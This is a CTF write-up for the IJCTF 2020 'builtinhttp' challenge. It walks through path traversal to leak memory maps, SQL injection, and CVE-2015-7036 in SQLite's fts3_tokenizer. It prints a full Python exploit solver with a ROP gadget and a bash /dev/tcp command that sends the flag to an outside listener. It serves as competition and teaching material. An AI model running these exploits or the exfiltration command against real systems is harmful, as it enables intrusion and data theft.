+++
title = 'IJCTF 2020 - builtinhttp'
date = '2020-04-27T00:00:00+07:00'
tags = ['ctf-writeup', 'pwn']
draft = false
+++

The intended solution was using a buffer overflow on `[^fopen_test:%arg_path%^]`. I did notice this bug first since I'm guessing that the binary should have a buffer overflow because there is no stack canary. The problem is that, I don't know there exist sqlite ATTACH DATABASE which you can use it to write into file system and then use it with fopen_test to pwn. The another bug I found was the sqlite injection and use fts3 module, this is something I didn't want to touch first since I know the fopen_test bug, but since I don't have any option left (It has been 6 hours finding how to write file into system and I still didn't know how to do it), I decided to use fts3 module exploit. Go to author excellent write-up on built_in_http to get the gist of this challenge [https://vuln.live/blog/9](https://vuln.live/blog/9). I'll not discuss deeper on the reversing part, just the basic idea of exploiting sqlite fts3 module and try to add some comments how I solved this challenge.

### **CVE-2015-7036**

This is known bug and has been left unfixed for years. The bug is in fts3_toknizer sql function, see the implementation here  
[https://github.com/sqlite/sqlite/blob/master/ext/fts3/fts3_tokenizer.c#L44-L64](https://github.com/sqlite/sqlite/blob/master/ext/fts3/fts3_tokenizer.c#L44-L64)  
`fts3_tokenizer(<name>, <pointer>)`, if `<pointer>` is specified, it'll try to load the blob from specified pointer. The blob is in fact a `sqlite3_tokenizer_module` struct,

```c
struct sqlite3_tokenizer_module {
  int iVersion;                  /* currently 0 */

  /*
  ** Create and destroy a tokenizer.  argc/argv are passed down from
  ** the fulltext virtual table creation to allow customization.
  */
  int (*xCreate)(int argc, const char **argv,
                 sqlite3_tokenizer **ppTokenizer);
  int (*xDestroy)(sqlite3_tokenizer *pTokenizer);

  /*
  ** Tokenize a particular input.  Call xOpen() to prepare to
  ** tokenize, xNext() repeatedly until it returns SQLITE_DONE, then
  ** xClose() to free any internal state.  The pInput passed to
  ** xOpen() must exist until the cursor is closed.  The ppToken
  ** result from xNext() is only valid until the next call to xNext()
  ** or until xClose() is called.
  */
  /* TODO(shess) current implementation requires pInput to be
  ** nul-terminated.  This should either be fixed, or pInput/nBytes
  ** should be converted to zInput.
  */
  int (*xOpen)(sqlite3_tokenizer *pTokenizer,
               const char *pInput, int nBytes,
               sqlite3_tokenizer_cursor **ppCursor);
  int (*xClose)(sqlite3_tokenizer_cursor *pCursor);
  int (*xNext)(sqlite3_tokenizer_cursor *pCursor,
               const char **ppToken, int *pnBytes,
               int *piStartOffset, int *piEndOffset, int *piPosition);
};
```

Since we are dealing with function pointers, getting a code execution from this should be fairly easy. Suppose we have a heap address leak, we could craft a `sqlite3_tokenizer_module` struct in heap with

```sql
SELECT replace(hex(zeroblob(10000)), '00', x'sqlite3_tokenizer_module struct here');
```

Then load the fts3_tokenizer module from heap with

```sql
    SELECT fts3_tokenizer('<tokenizer name>', x'<crafted sqlite3_tokenizer_module_address>');
```

Trigger code execution via crafted function pointers from `sqlite3_tokenizer_module` struct,

- `xCreate` with `CREATE VIRTUAL TABLE pwn USING fts3(tokenize=<tokenizer name>);`
- `xDestroy` with `DROP TABLE pwn;`
- `xOpen` with `INSERT INTO pwn VALUES(x'values here');`

### **builtin_http**

To pwn this, first we need a leak. read `/proc/self/maps` to get heap and lib address leak via LFI in `/static/../../../../` endpoint.

```py
from pwn import *
HOST, PORT = ('34.87.169.10', 31339)

def read_file(path):
    r = remote(HOST, PORT)
    r.send(b'GET /static/../../../../../../../../../../../../..%b HTTP/1.1\r\n\r\n' % path)
    r.recvuntil(b'text/html\n\n')
    res = r.recvall()
    r.close()
    return res

heap_base = 0
sqlbase = 0

def read_map():
    global heap_base, sqlbase
    maps = read_file(b'/proc/self/maps')[:-1]
    maps = maps.split(b'\n')
    for line in maps:
        if b'[heap]' in line:
            heap_base = int(line.split(b'-')[0], 16)
        elif b'libsqlite3' in line:
            sqlbase = int(line.split(b'-')[0], 16)
            break
def exploit():
    read_map()
    print("[!] heap %x" % heap_base)
    print("[!] libsqlite3.so %x" % sqlbase)
```

The next part is to craft `sqlite3_tokenizer_module`, to do this we can use built in [`simple` fts module](https://github.com/sqlite/sqlite/blob/master/ext/fts1/simple_tokenizer.c#L161-L168),

```c
static sqlite3_tokenizer_module simpleTokenizerModule = {
  0,
  simpleCreate,
  simpleDestroy,
  simpleOpen,
  simpleClose,
  simpleNext,
};
```

```py
server = ELF('./server', 0)
system = server.plt['system']
simple_create = 0x2abd0
simple_destroy = 0x23c40
simple_open = 0x2ab40
simple_close = 0x19080
simple_next = 0x2cb50

def admin(var, key=b'20c366aada34781158ae700cec09a4ce'):
    r = remote(HOST, PORT)
    r.send(b'GET /admin?key=%b&var=%b HTTP/1.1\r\n\r\n' % (key, var))
    r.close()

def fire(heap_base, sqlbase, offset=0):
    fts_module_struct_addr = heap_base + offset

    fts_module_struct  = p64(0) # version
    fts_module_struct += p64(sqlbase + simple_create) # xCreate
    fts_module_struct += p64(sqlbase + simple_destroy) # xDestroy
    fts_module_struct += p64(sqlbase + simple_open) # xOpen
    fts_module_struct += p64(sqlbase + simple_close) # xClose
    fts_module_struct += p64(sqlbase + simple_next) # xNext

    payload  = b"asd';"
    payload += b"select replace(hex(zeroblob(10000)), '00', x'4242424242424242%b4343434343434343');" % (hexlify(fts_module_struct))
    payload += b"select fts3_tokenizer('exploit', x'%b');" % hexlify(p64(fts_module_struct_addr))
    payload += b"create virtual table pwn using fts3(tokenize='exploit');"
    payload += b"-- "
    admin(payload.replace(b" ", b"/**/"))
```

override one of function pointers to get a code execution, a screenshot when I override `xCreate`

![https://a.pomf.cat/bgnhnh.png](https://a.pomf.cat/bgnhnh.png)

![https://a.pomf.cat/igihno.png](https://a.pomf.cat/igihno.png)

This is actually great, `rax` holds pointer to our crafted `sqlite3_tokenizer_module` , since we can get a hold of whats inside `rax`, we just need to find a reliable gadget

```sh
λ › ropper --file ./libsqlite3.so.0.8.6 --search 'mov ???, [rax]' | grep call
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov ???, [rax]
[INFO] File: ./libsqlite3.so.0.8.6
0x0000000000078fd2: mov eax, dword ptr [rax]; call qword ptr [rax + 0x28];
0x000000000008d367: mov eax, dword ptr [rax]; mov rdi, rax; call qword ptr [rax + 0x38];
0x0000000000078fd1: mov rax, qword ptr [rax]; call qword ptr [rax + 0x28];
0x000000000008d366: mov rax, qword ptr [rax]; mov rdi, rax; call qword ptr [rax + 0x38];
```

Luckily, the latest version of libsqlite3 in Ubuntu 16.04.6 has this nice gadget we can use. We can both control next call (`[[rax] + 0x38]`) and the first parameter with `rdi`. `0x000000000008d366: mov rax, qword ptr [rax]; mov rdi, rax; call qword ptr [rax + 0x38];`  
The final step is just to override xCreate with the gadget and include our shell payload. Full solver,

```py
from pwn import *
from binascii import hexlify

# HOST, PORT = ('34.87.169.10', 31339)
HOST, PORT = ('127.0.0.1', 3000)

def read_file(path):
    r = remote(HOST, PORT)
    r.send(b'GET /static/../../../../../../../../../../../../..%b HTTP/1.1\r\n\r\n' % path)
    r.recvuntil(b'text/html\n\n')
    res = r.recvall()
    r.close()
    return res

def admin(var, key=b'20c366aada34781158ae700cec09a4ce'):
    r = remote(HOST, PORT)
    r.send(b'GET /admin?key=%b&var=%b HTTP/1.1\r\n\r\n' % (key, var))
    r.close()

def read_map():
    maps = read_file(b'/proc/self/maps')[:-1]
    maps = maps.split(b'\n')
    for line in maps:
        if b'[heap]' in line:
            heap_base = int(line.split(b'-')[0], 16)
            elif b'libsqlite3' in line:
            sqlbase = int(line.split(b'-')[0], 16)
            break
    return heap_base, sqlbase

server = ELF('./server', 0)
system = server.plt['system']
simple_create = 0x2abd0
simple_destroy = 0x23c40
simple_open = 0x2ab40
simple_close = 0x19080
simple_next = 0x2cb50

def fire(heap_base, sqlbase, offset=0x45190):
    fts_module_struct_addr = heap_base + offset
    shell_addr = fts_module_struct_addr + 0x38

    fts_module_struct  = p64(shell_addr) # version
    fts_module_struct += p64(sqlbase + 0x000000000008d366) # xCreate
    fts_module_struct += p64(sqlbase + simple_destroy) # xDestroy
    fts_module_struct += p64(sqlbase + simple_open) # xOpen
    fts_module_struct += p64(sqlbase + simple_close) # xClose
    fts_module_struct += p64(sqlbase + simple_next) # xNext
    # 0x000000000008d366: mov rax, qword ptr [rax]; mov rdi, rax; call qword ptr [rax + 0x38];

    shell = b'bash -c "/flag > /dev/tcp/xx.xx.xx.xx/9090"\x00'
    shell = shell.ljust(0x38, b'\x00')
    shell += p64(system)

    # pwndbg> dq $rax
    # 000000000199b190     0000000000000000 deadbeefdeadbeef
    # 000000000199b1a0     00007fd8b5a07c40 00007fd8b5a0eb40
    # 000000000199b1b0     00007fd8b59fd080 00007fd8b5a10b50
    # 000000000199b1c0     4343434343434343 20632d2068736162
    #                                       ^ ---- our shell starts here
    # 000000000199b1d0     3e2067616c662f22 63742f7665642f20
    # 000000000199b1e0     33312e3330312f70 2f39312e36352e33
    # 000000000199b1f0     0000002230393039 0000000000000000
    # 000000000199b200     00000000004022d0 4444444444444444

    payload  = b"asd';"
    payload += b"SELECT replace(hex(zeroblob(10000)), '00', x'4242424242424242%b4343434343434343%b4444444444444444');" % (hexlify(fts_module_struct), hexlify(shell))
    payload += b"select fts3_tokenizer('exploit', x'%b');" % hexlify(p64(fts_module_struct_addr))
    payload += b"create virtual table kok using fts3(tokenize='exploit');"
    payload += b"-- "
    admin(payload.replace(b" ", b"/**/"))

def exploit():
    for off in range(0, 0x1000, 8):
        heap_base, sqlbase = read_map()
        print("[!] heap %x" % heap_base)
        print("[!] libsqlite3.so %x" % sqlbase)
        fire(heap_base, sqlbase, 0x45190 + off)

exploit()

# ijctf{Nah...sqlite_B0F_1s_H4rd!}
```

Since the offset on the server might be different I need to brute force a little and after that we just need to spawn a listener and we will be greeted by the flag.

```
Listening on [0.0.0.0] (family 0, port 9090) Connection from 10.169.87.34.bc.googleusercontent.com 55242 received!
ijctf{Nah...sqlite_B0F_1s_H4rd!}
```